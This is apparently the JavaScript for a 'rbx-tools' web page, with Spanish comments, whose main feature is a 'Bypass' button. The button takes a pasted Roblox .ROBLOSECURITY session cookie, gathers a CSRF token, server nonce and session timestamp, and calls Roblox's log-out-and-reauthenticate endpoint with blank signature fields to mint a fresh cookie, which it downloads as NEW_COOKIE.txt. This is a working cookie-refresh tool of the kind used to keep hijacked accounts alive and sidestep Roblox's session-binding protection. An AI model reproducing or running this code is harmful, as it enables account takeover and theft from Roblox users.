window.onload = function() {
    // Inicializa las partículas de fondo
    try {
        Particles.init({
            selector: '.background',
            maxParticles: 100,
            connectParticles: true,
            speed: 2,
            minDistance: 100,
            sizeVariations: 3,
            color: '#ffffff'
        });
    } catch (error) {
        console.error("Error initializing particles:", error);
    }

    // Selecciona los enlaces de navegación y el enlace de contacto
    const navLinks = document.querySelectorAll('.nav-list > li > a');
    const contactLink = document.getElementById('contactLink');
    const copyMessage = document.getElementById('copyMessage');
    const bypassButton = document.getElementById('bypassButton');

    // Agrega un evento de clic a cada enlace de navegación
    navLinks.forEach(link => {
        link.addEventListener('click', function() {
            // Elimina la clase 'active' de todos los enlaces
            navLinks.forEach(item => item.classList.remove('active'));
            // Agrega la clase 'active' al enlace clicado
            this.classList.add('active');
            
            // Si el enlace clicado es el de contacto
            if (this === contactLink) {
                // Crea un elemento de texto temporal
                const tempInput = document.createElement('input');
                tempInput.value = 'rbx-tools@gmail.com';
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy'); // Copia el texto al portapapeles
                document.body.removeChild(tempInput); // Elimina el elemento temporal

                // Muestra el mensaje "Copied!"
                copyMessage.style.display = 'block';
                setTimeout(() => {
                    copyMessage.style.opacity = '1'; // Aparece el mensaje
                }, 10); // Permite que la propiedad display: block surta efecto
                
                setTimeout(() => {
                    copyMessage.style.opacity = '0'; // Desaparece el mensaje
                }, 2000); // Muestra durante 2 segundos
                
                setTimeout(() => {
                    copyMessage.style.display = 'none'; // Oculta después de la animación
                }, 2500); // Oculta después de que la animación se complete
            }
        });
    });

    // Funcionalidad del botón Bypass
    bypassButton.addEventListener('click', async function() {
        const authCookie = document.getElementById('cookieInput').value;

        if (authCookie) {
            try {
                const newAuthCookie = await refresh(authCookie);
                if (newAuthCookie) {
                    // Guardar la nueva cookie en un archivo
                    downloadNewCookie(newAuthCookie);
                } else {
                    alert("Failed to refresh cookie.");
                }
            } catch (error) {
                alert("Error refreshing cookie: " + error.message);
            }
        } else {
            alert("Por favor, ingresa una cookie válida.");
        }
    });
};

// Función para obtener el CSRF token
async function getCsrfToken(cookie) {
    const response = await fetch("https://auth.roblox.com/v2/login", {
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({})
    });

    const csrfToken = response.headers.get("X-CSRF-TOKEN");
    return csrfToken;
}

// Función para obtener el nonce
async function getNonce(cookie) {
    const response = await fetch("https://apis.roblox.com/hba-service/v1/getServerNonce", {
        method: "GET",
        headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Content-Type": "application/json"
        }
    });

    const nonce = await response.text();
    return nonce.trim();
}

// Función para obtener el timestamp de la última sesión
async function getEpoch(cookie) {
    const response = await fetch("https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor=&desiredLimit=25", {
        method: "GET",
        headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Content-Type": "application/json"
        }
    });

    const data = await response.json();
    return data.sessions[0]?.lastAccessedTimestampEpochMilliseconds || null;
}

// Función para refrescar la cookie
async function refresh(cookie) {
    const nonce = await getNonce(cookie);
    const csrfToken = await getCsrfToken(cookie);
    const epoch = await getEpoch(cookie);

    if (!nonce || !csrfToken || !epoch) {
        throw new Error("Failed to retrieve necessary tokens");
    }

    const payload = JSON.stringify({
        secureAuthenticationIntent: {
            clientEpochTimestamp: epoch,
            clientPublicKey: null,
            saiSignature: null,
            serverNonce: nonce
        }
    });

    const response = await fetch("https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate", {
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Origin": "https://roblox.com",
            "Referer": "https://roblox.com",
            "Accept": "application/json",
            "X-Csrf-Token": csrfToken,
            "Content-Type": "application/json"
        },
        body: payload
    });

    if (!response.ok) {
        throw new Error(`Failed to refresh cookie: ${response.status}`);
    }

    const setCookieHeader = response.headers.get("set-cookie");
    if (setCookieHeader) {
        const refreshedCookie = setCookieHeader.split(';')[0].replace('.ROBLOSECURITY=', '');
        return refreshedCookie;
    }

    throw new Error("Failed to refresh cookie");
}

// Función para descargar la nueva cookie
function downloadNewCookie(newAuthCookie) {
    const blob = new Blob([newAuthCookie], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'NEW_COOKIE.txt';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}
